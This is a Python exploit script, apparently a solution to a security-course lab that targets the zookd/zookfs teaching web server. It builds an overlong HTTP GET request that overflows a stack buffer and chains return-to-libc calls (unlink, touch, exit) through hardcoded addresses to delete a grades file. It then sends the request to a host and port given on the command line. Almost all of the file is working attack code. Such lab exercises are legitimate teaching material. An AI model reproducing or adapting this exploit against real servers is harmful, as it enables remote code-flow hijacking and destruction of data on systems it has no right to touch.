#!/usr/bin/python
import sys
import socket
import traceback
import urllib
import struct

####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.

pop_ret_addr = 0x4014a4fd
zook_touch_retaddr = 0x804902d
libc_unlink_retaddr = 0x40102450
libc_exit_retaddr = 0x40058150

stack_saved_ebp = 0xbffff618

buffer_offset = 0x810

def repeat_to_length(string_to_expand, length):
    return (string_to_expand * (int(length/len(string_to_expand))+1))[:length]

def build_exploit(shellcode):
    ## Things that you might find useful in constructing your exploit:
    ##   urllib.quote(s)
    ##     returns string s with "special" characters percent-encoded
    ##   struct.pack("<I", x)
    ##     returns the 4-byte binary encoding of the 32-bit integer x
    ##   variables for program addresses (ebp, buffer, retaddr=ebp+4)
    fill_len = buffer_offset - 1 + 4

    unlink_param1_addr = stack_saved_ebp + 28
    touch_param1_addr = stack_saved_ebp + 28

    asms = urllib.quote(
        struct.pack("<I", libc_unlink_retaddr) + \
        struct.pack("<I", pop_ret_addr) + \
        struct.pack("<I", unlink_param1_addr) + \

        struct.pack("<I", zook_touch_retaddr) + \
        struct.pack("<I", libc_exit_retaddr) + \
        struct.pack("<I", touch_param1_addr + 12) # pointer to "grades.txt"
    )

    req =  "GET /" + repeat_to_length("A", fill_len) + \
        asms + \
        urllib.quote("/home/httpd/grades.txt") + \
        " HTTP/1.0\r\n" + "\r\n"
    return req

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
	resp = resp + rbuf
	rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "r")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

